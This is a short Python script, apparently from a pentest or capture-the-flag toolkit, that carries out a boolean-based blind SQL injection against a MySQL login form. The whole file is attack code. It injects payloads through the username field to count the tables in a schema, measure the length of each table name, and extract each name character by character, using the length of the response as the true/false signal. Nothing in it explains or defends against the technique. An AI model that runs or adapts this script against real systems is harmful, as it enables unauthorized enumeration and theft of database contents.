# MYSQL - Blind sqli
    # Get get all tables

from requests import post
from string import ascii_letters, digits

class Attack:
    URL = 'https://vuln/login.php'
    SCHEMA_NAME = 'CHANGEME'

    def __init__(self) -> None:
        total_table = self.get_total_table()
        self.get_tables(total_table)

    def get_total_table(self) -> int:
        for guess in range(1, 20):
            p = {"username": f"admin' and (SELECT COUNT(*)={guess} total_schemas FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}')#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            print(guess, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(total_table)={guess}')
                return guess
    
    def get_table_name_length(self, index: int) -> int:
        for name_length in range(1, 100):
            p = {"username": f"admin' and (SELECT LENGTH((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {index}))={name_length})#", "password": "<ignore>"}
            resp = post(self.URL, data=p)
            print(name_length, len(resp.text))
            if len(resp.text) > 2000:
                print(f'len(table[{index}])={name_length}')
                return name_length


    def get_tables(self, n: int) -> None:
        for table_index in range(n):
            name_length = self.get_table_name_length(table_index)
            table_name = ''
            for name_index in range(1, name_length+1):
                for guess in ascii_letters + digits:
                    p = {"username": f"admin' and (SELECT ASCII(SUBSTRING((SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='{self.SCHEMA_NAME}' ORDER BY TABLE_NAME LIMIT 1 OFFSET {table_index}),{name_index},1))={ord(guess)})#", "password": "<ignore>"}
                    resp = post(self.URL, data=p)
                    print(guess, len(resp.text))
                    if len(resp.text) > 2000:
                        table_name += guess
                        print(f'table[{table_index}][{name_index}/{name_length}]={table_name}')
                        break

if __name__ == '__main__':
    Attack()
